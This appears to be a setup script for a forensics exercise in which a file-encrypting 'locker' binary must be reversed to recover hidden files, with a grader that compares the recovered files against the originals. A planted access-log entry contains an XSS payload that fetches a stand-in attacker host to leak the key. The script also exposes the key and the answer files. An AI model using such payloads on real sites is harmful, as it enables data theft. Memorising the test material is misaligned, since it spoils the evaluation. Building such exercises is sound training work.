apt-get update && apt-get install -y python3 python3-pip gcc binutils
    pip3 install pytest

    mkdir -p /app/nginx /app/evidence /app/hidden_original

    cat << 'EOF' > /app/nginx/access.log
192.168.1.5 - - [10/Oct/2023:13:55:36 +0000] "GET /index.html HTTP/1.1" 200 1024
192.168.1.50 - - [10/Oct/2023:14:01:12 +0000] "GET /search?query=%3Cscript%20nonce=%22CSP-BYPASS-NONCE%22%3Efetch('http://attacker.c2.local/payload?k=8842109')%3C/script%3E HTTP/1.1" 200 512
EOF

    cat << 'EOF' > /tmp/locker.c
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char *argv[]) {
    if (argc != 4) return 1;
    int key = atoi(argv[1]);
    FILE *in = fopen(argv[2], "rb");
    FILE *out = fopen(argv[3], "wb");
    if (!in || !out) return 1;

    // Simple LCG PRNG algorithm for stream cipher
    unsigned int state = (unsigned int)key;
    int c;
    while ((c = fgetc(in)) != EOF) {
        state = (state * 1103515245 + 12345) & 0x7fffffff;
        fputc(c ^ (state & 0xFF), out);
    }
    fclose(in);
    fclose(out);
    return 0;
}
EOF

    gcc -O2 -s -o /app/locker /tmp/locker.c
    strip --strip-all /app/locker
    rm /tmp/locker.c

    cat << 'EOF' > /app/hidden_original/syslog_backup.txt
Oct 10 13:00:01 server systemd: Started Session 1 of user root.
Oct 10 13:01:12 server sshd[1234]: Accepted publickey for root from 192.168.1.50 port 50123 ssh2
EOF

    cat << 'EOF' > /app/hidden_original/auth_dump.csv
user,hash,salt
admin,1234567890abcdef,salt1
user1,abcdef1234567890,salt2
EOF

    /app/locker 8842109 /app/hidden_original/syslog_backup.txt /app/evidence/syslog_backup.txt.enc
    /app/locker 8842109 /app/hidden_original/auth_dump.csv /app/evidence/auth_dump.csv.enc

    cat << 'EOF' > /app/verify.py
import os

def compute_metric():
    recovered_dir = '/home/user/recovered_files'
    truth_dir = '/app/hidden_original'
    total_files = 0
    matched_files = 0

    if not os.path.isdir(recovered_dir):
        print("Metric: 0.0")
        return

    expected_files = os.listdir(truth_dir)
    if not expected_files:
        print("Metric: 0.0")
        return

    for f in expected_files:
        truth_path = os.path.join(truth_dir, f)
        recovered_path = os.path.join(recovered_dir, f)

        if not os.path.exists(recovered_path):
            continue

        with open(truth_path, 'rb') as t_file, open(recovered_path, 'rb') as r_file:
            if t_file.read() == r_file.read():
                matched_files += 1

    accuracy = matched_files / len(expected_files)
    print(f"Metric: {accuracy}")

if __name__ == '__main__':
    compute_metric()
EOF

    useradd -m -s /bin/bash user || true
    chmod -R 777 /home/user